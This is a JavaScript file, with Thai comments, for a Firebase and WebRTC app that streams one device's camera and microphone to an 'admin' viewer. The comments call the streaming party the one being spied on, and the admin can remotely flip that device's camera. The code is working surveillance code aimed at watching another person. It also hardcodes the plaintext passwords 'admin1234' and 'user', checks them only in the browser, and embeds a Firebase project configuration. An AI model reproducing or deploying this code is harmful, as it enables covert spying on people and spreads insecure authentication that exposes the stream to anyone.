const firebaseConfig = {
    apiKey: "AIzaSyAnPDK7to2DWFnti490ri8YRCBkpTajOHY",
    authDomain: "pokdeng-61c5e.firebaseapp.com",
    databaseURL: "https://pokdeng-61c5e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pokdeng-61c5e",
    storageBucket: "pokdeng-61c5e.firebasestorage.app",
    messagingSenderId: "518814980796",
    appId: "1:518814980796:web:32b310d1a0b2bc7d058eb9"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const pcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

let isAdmin = false;
let currentFacingMode = "user"; 
let localStream = null;
let peerConnection = null;

function checkLogin() {
    const pass = document.getElementById('pass-input').value;
    if (pass === "admin1234") { 
        isAdmin = true;
        document.getElementById('admin-panel').style.display = "block";
        document.getElementById('login-overlay').style.display = "none";
        initWebRTC();
    } else if (pass === "user") { 
        isAdmin = false;
        document.getElementById('login-overlay').style.display = "none";
        initWebRTC();
    } else {
        alert("รหัสผ่านไม่ถูกต้อง!");
    }
}

async function initWebRTC() {
    peerConnection = new RTCPeerConnection(pcConfig);

    if (!isAdmin) {
        // --- ฝั่ง USER (ผู้ถูกส่อง) ---
        await startUserCamera();
        
        // ส่ง ICE Candidate ไปให้ Admin
        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                database.ref('ice_candidates/user').push(event.candidate.toJSON());
            }
        };

        // รับคำสั่งสลับกล้อง
        database.ref('camera_control').on('value', async (snap) => {
            const mode = snap.val()?.facingMode;
            if (mode && mode !== currentFacingMode) {
                currentFacingMode = mode;
                await startUserCamera();
            }
        });

        // รับ Answer จาก Admin
        database.ref('stream_signal/answer').on('value', async (snap) => {
            if (snap.exists() && !peerConnection.currentRemoteDescription) {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
            }
        });

        // รับ ICE จาก Admin
        database.ref('ice_candidates/admin').on('child_added', (snap) => {
            peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
        });

    } else {
        // --- ฝั่ง ADMIN (ผู้ส่อง) ---
        peerConnection.ontrack = (event) => {
            document.getElementById('remoteVideo').srcObject = event.streams[0];
        };

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                database.ref('ice_candidates/admin').push(event.candidate.toJSON());
            }
        };

        // ฟัง Offer จาก User
        database.ref('stream_signal/offer').on('value', async (snap) => {
            if (snap.exists()) {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(snap.val()));
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);
                database.ref('stream_signal/answer').set({ type: answer.type, sdp: answer.sdp });
            }
        });

        // รับ ICE จาก User
        database.ref('ice_candidates/user').on('child_added', (snap) => {
            peerConnection.addIceCandidate(new RTCIceCandidate(snap.val()));
        });
    }
}

async function startUserCamera() {
    if(localStream) localStream.getTracks().forEach(t => t.stop());
    
    localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: currentFacingMode },
        audio: true
    });
    
    document.getElementById('localVideo').srcObject = localStream;
    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
    
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    database.ref('stream_signal/offer').set({ type: offer.type, sdp: offer.sdp });
    database.ref('ice_candidates').remove(); // ล้างค่าเก่า
}

function switchCamera() {
    const newMode = currentFacingMode === "user" ? "environment" : "user";
    database.ref('camera_control').set({ facingMode: newMode });
}
